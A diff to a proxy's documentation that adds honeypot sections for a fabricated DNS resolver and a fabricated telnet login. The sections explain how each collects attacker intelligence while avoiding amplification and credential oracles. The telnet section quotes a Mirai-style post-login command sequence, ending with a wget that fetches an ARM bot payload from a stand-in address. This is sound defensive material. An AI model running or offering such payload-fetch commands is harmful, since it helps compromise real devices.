@@ -41,6 +41,8 @@ exist.
 - [A cache that is not there](#a-cache-that-is-not-there)
 - [A MySQL that is not there](#a-mysql-that-is-not-there)
 - [A PostgreSQL that is not there](#a-postgresql-that-is-not-there)
+- [A resolver that is not there](#a-resolver-that-is-not-there)
+- [A login that is not there](#a-login-that-is-not-there)
 - [Refusal at the TLS handshake](#refusal-at-the-tls-handshake)
 - [What it produces](#what-it-produces)
 - [Building it out](#building-it-out)
@@ -89,6 +91,8 @@ Two consequences worth stating plainly:
 | Fabricated device | `modbus.deception`, `iec104.deception`, `s7.deception`, `snmp.deception` | A plant it must map, all of it wrong; the tripwire that fires while it does | A frame on its way to a real device answered by the fabrication -- which is what the one rule exists to prevent | None: it answers only where a refusal would be |
 | Fabricated cache | `redis.deception` | The whole exploit chain, answered -- and its directory, file name and payload in your log | The same, plus a value read back that was never stored | None, as above |
 | Fabricated database | `mysql.deception`, `postgres.deception` | The reconnaissance, answered consistently -- and which escalation it was for: a web shell, a key off the server, a file off the *client*, or, on PostgreSQL, a shell command the manual documents | The same, plus an empty result set where a real query needed rows | None, as above |
+| Fabricated resolver | `dns.deception` | The refusal it was reading, and the rest of what was leaving: a tunnel told NXDOMAIN moves channel, one that is answered keeps sending | A fabricated answer aimed at a real host, if the pool names one; an amplifier, if the bound were not there | None: it answers only where a refusal would be |
+| Fabricated login | `telnet.deception` | The dictionary it is walking, and then the payload: the address it fetches from, the architecture it built for | A real operator handed a fabricated device during an outage -- which is why it never replaces one | None: it answers only where a refusal would be |
 | Handshake refusal | `handshake` | A key exchange it does not get to spend | A client refused with no log line to explain it | Only what the ban list holds |
 
 ## How the signals chain
@@ -940,6 +944,165 @@ itself, so a `decoy` listener with a `tls` section serves a client that insists 
 `sslmode=require` — which is worth having, because a database that refuses TLS is
 itself a thing a careful scanner notices.
 
+## A resolver that is not there
+
+Every fabrication above replaces a refusal the other end would have read. On DNS
+the refusal is *all* the other end reads, because the query is the only thing it
+ever sends.
+
+That makes the arithmetic different here. A name on a threat feed answered
+NXDOMAIN tells an implant that something on this network is deciding, and it has
+a list of other names to try. A domain a client was caught tunnelling under,
+refused for the cooldown, tells the tunnel to move — and the channel it moves to
+is the one nobody is watching. Both refusals are correct. Both also end the only
+conversation you were going to get.
+
+```yaml
+# A honeypot resolver on the client network: nothing behind it.
+- name: resolver-spare
+  address: "10.70.0.53:53"
+  kind: dns
+  dns:
+    cookies: require          # so the record of who visited means something
+    deception:
+      mode: decoy
+      profile: documentation  # RFC 5737 and RFC 3849: nothing routes there
+      ttl: 300s
+      tripwire: [payroll.internal]
+```
+
+**The rule is the same one**: a query that was going to reach a resolver is never
+answered by the fabrication. On a listener that really resolves (`mode: answer`)
+it sits in exactly the four places a refusal would be written — the block list, an
+imported name list, a policy zone whose action is `nxdomain`, and the tunnelling
+cooldown — and nowhere else. An RPZ rule that named `local` data or `nodata` is an
+answer somebody wrote, and this does not overrule it.
+
+**A different address for every name**, which is the difference between this and
+the `sinkhole_ipv4` this listener has always had. A sinkhole answers one address
+for everything, so a visitor who looks up two blocked names and gets one address
+has found it in one extra query. A fabricated answer is drawn from a pool by the
+name — stable for the life of the configuration, different for the next name — so
+what a visitor maps looks like hosting.
+
+**Two things here are about not becoming a weapon,** and they are the reason this
+section is more careful than the others.
+
+A resolver is an amplifier. A datagram proves nothing about where it came from, so
+a fabrication that answered a forty-octet question with a kilobyte would be a
+reflector aimed at whoever the source address really belongs to. So the answers
+are small by construction — four types, a short TXT string, no ANY expansion — and
+an answer to a client whose address nothing has verified is bounded against the
+question that asked for it and truncated past that bound. A real client comes back
+over TCP. A spoofed source cannot. On a decoy listener, `cookies: require` is
+worth the compatibility it costs: nothing amplifies either way, but without it the
+address in your record is the one the packet *claimed*, and on a honeypot that
+record is the whole product.
+
+And a fabricated address is somewhere a visitor then goes. The default pool is the
+documentation range, which nothing routes and nobody hosts in, so a fabricated
+answer cannot direct traffic at a real host — and an operator reading a firewall
+log recognises `192.0.2.0/24` on sight. Pointing the pool at your own honeypot is
+the powerful configuration, because then the *next* step is collected too: name
+resolved here, connection accepted there. It is also the one that has to be
+deliberate, and validation says so when the pool is inside the estate.
+
+**What it will not pretend.** It answers A, AAAA, TXT and PTR, and everything else
+is NODATA — inventing an MX would mean inventing a mail host, and an NS or SOA
+would be a claim of authority a forwarding resolver is not making. The TXT answer,
+which is the one a tunnel is waiting for, carries no command: this fabrication does
+not know the other end's protocol and will not guess. What it has is the right
+*shape*, and a tunnel that accepts an answer sends the next chunk — which is the
+whole point.
+
+**The tripwires need no configuring, and here they are mostly types.** A zone
+transfer, a signature set, ANY, the NULL record that exists to carry arbitrary
+octets, a query in a class that is not IN, and a name over a hundred octets: none
+of those has a use against a forwarding resolver, and the last one is a tunnel
+every time. The fingerprint names — `version.bind`, `hostname.bind`, `id.server`
+— trip and are never answered, for the reason the S7 section gives about the
+system status list: a service that names itself has handed over the list of what
+it is vulnerable to.
+
+## A login that is not there
+
+Everything above answers a *protocol*. This one answers a person, or more often a
+program pretending to be one, and the thing it collects is not a reply but a list.
+
+A telnet port on a public address is found within the hour. What finds it is a
+dictionary: the Mirai family and everything written after it walk a list of the
+credentials that shipped on recorders, cameras and routers -- a few thousand pairs,
+tried a handful at a time from a great many addresses so that no one of them looks
+like an attack.
+
+Refusing collects the address, which the firewall log already had. Answering
+collects the list, and then the part that matters:
+
+```
+enable / system / shell / sh          is this a shell
+/bin/busybox MIRAI                    is it busybox, and which one
+echo -e '\x6b\x61\x6d\x69'            is anything actually reading this
+cat /proc/cpuinfo                     which payload do I need
+wget http://198.51.100.9/bins/x.arm7  and here is where it lives
+```
+
+That last line names the payload, the address serving it and the architecture it
+was built for. Nothing else in this proxy produces it, and it arrives four
+exchanges after a login that a refusal would have ended.
+
+```yaml
+# A honeypot on the plant network: a recorder that is not there.
+- name: legacy-spare
+  address: "10.70.0.23:23"
+  kind: telnet
+  telnet:
+    deception:
+      mode: decoy
+      profile: busybox
+      hostname: cam-07      # something this estate really has
+      attempts: 2           # what a real device's login looks like
+```
+
+**The rule is the same one.** On a listener that fronts real equipment
+(`mode: answer`) the fabrication sits where a refusal would be written -- a failed
+second factor, the authorisation policy, a missing grant -- and nowhere else. It
+does not replace `allow_clients` or a ban, because an address that may not connect
+gets nothing. And it never replaces an **outage**: an operator working an incident
+who cannot reach the equipment must be told that, not handed a device that is not
+there. That is the one place in this whole document where answering would cost more
+than refusing.
+
+**The login never turns on the credential.** Every credential is accepted once the
+configured number of attempts has been taken, and which one it was makes no
+difference to what follows. A trap that accepted the right password and refused the
+wrong one would be a credential oracle, which is the one thing a password list
+needs -- the same reason the fabricated Redis accepts every `AUTH`.
+
+**No password is kept, in any form a guess can be tested against.** This is the
+section where that rule is hardest and matters most, because here the credential
+*is* the intelligence. What is kept is the user name, the credential's length, and
+a handle computed under a key the process made at startup from the system random
+source and never writes down. That answers the operator's real question -- how many
+distinct passwords did this client try, and have we seen this one before -- and
+answers nothing at all to whoever reads the log later. After a restart the handles
+are new, which is correct: the question was about a campaign, not about a password.
+A process with no random source produces no handle rather than one under a constant
+key. And the recording, where one is configured, holds the shell transcript and not
+the login.
+
+**Nothing is run and nothing is fetched.** `wget` and its family answer the
+connection timeout a device behind a firewall answers -- after the address has been
+written down. A fabrication that fetched the payload would be performing the
+download on the attacker's behalf, from this estate's address, with this estate's
+reputation, and would turn a sensor into a participant.
+
+**And it invents no credentials.** `/etc/shadow` lists the accounts with `*` where
+a hash would be: a fabricated hash is a machine's worth of somebody's time spent on
+nothing, and a thing an operator could later mistake for real. `/tmp` is empty and
+so is the shell history, for the reason the Modbus section gives about not
+inventing a consequence it cannot maintain -- a fabricated history is a fabricated
+person who used this machine.
+
 ## Refusal at the TLS handshake
 
 ```yaml
@@ -980,6 +1143,7 @@ up in a management view:
 | WAF rule | `waf` | `waf_matched`, `waf_message` | `xproxy_waf_*` | `xproxyctl waf rules` |
 | Slow lane | — | `degraded: <level>` | `xproxy_degraded_total{level}` | `GET /v1/degradation` |
 | Deceptive answer | `deceive` | `deceived: <route>` | `xproxy_deceived_total{route}` | `GET /v1/deceive` |
+| Fabricated service | `<kind>_deceived`, `<kind>_tripwire` | *(none — none of these kinds is HTTP)* | `<kind>_deceived`, `<kind>_tripwire` | `xproxyctl decoys` |
 | Handshake refusal | `handshake` | *(none — there is no request)* | `xproxy_tls_handshakes_refused_total` | `xproxyctl tls` |
 
 What to alert on, in order: **any honeytoken hit** (one is enough), a
